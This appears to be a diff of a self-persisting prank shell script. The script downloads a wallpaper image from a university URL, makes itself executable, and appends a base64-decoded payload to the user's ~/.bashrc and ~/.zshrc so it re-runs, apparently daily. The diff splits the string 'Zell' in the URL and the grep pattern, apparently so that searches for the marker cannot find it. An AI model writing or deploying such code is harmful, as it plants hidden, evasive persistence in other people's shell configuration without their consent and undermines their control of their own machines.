@@ -53,7 +53,7 @@ change_wp(){
 
     mkdir -p "$HOME/.local/var"
     if [ ! -f "$wallpaper" ] || [ "$(sha512sum "$wallpaper" | cut -c1-128)" != "1a5e6914ea7028cccc6a9bbaf27ad2f2ee7b44fdab061b9760ee44226b3ceea4a3574fec6a67157a140bb61a3c243a050b1cb2e3661cf032f42864a0429c6853" ]; then
-        wget -4 --output-document "$wallpaper" 'https://uni-tuebingen.de/fileadmin/_processed_/c/c/csm_zell_d1c0ad11c0.jpg' 2>/dev/null
+        wget -4 --output-document "$wallpaper" 'https://uni-tuebingen.de/fileadmin/_processed_/c/c/csm_z'"el"'l_d1c0ad11c0.jpg' 2>/dev/null
     fi
 
     # can't use [[ "$de_info" == *"string"* ]] here because [[ is not posix!
@@ -82,13 +82,13 @@ if [ "$(($(date +%s) - t_last_edit))" -ge 86400 ] || [ "$(whoami | tr '[:upper:]
     chmod +x -- "$this_file_path"
 
     if [ -f "$HOME/.bashrc" ]; then
-        grep -vE '# Viel Spass mit Zell!' "$HOME/.bashrc" > "$HOME/.bashrc_new"
+        grep -vE '# Viel Spass mit [Z](e)[l]l!' "$HOME/.bashrc" > "$HOME/.bashrc_new"
         mv "$HOME/.bashrc_new" "${HOME}/.bashrc"
         echo "$base64_addition" | base64 --decode >> "$HOME/.bashrc"
     fi
 
     if [ -f "$HOME/.zshrc" ]; then
-        grep -vE '# Viel Spass mit Zell!' "$HOME/.zshrc" > "$HOME/.zshrc_new"
+        grep -vE '# Viel Spass mit [Z](e)[l]l!' "$HOME/.zshrc" > "$HOME/.zshrc_new"
         mv "$HOME/.zshrc_new" "${HOME}/.zshrc"
         echo "$base64_addition" | base64 --decode >> "$HOME/.zshrc"
     fi
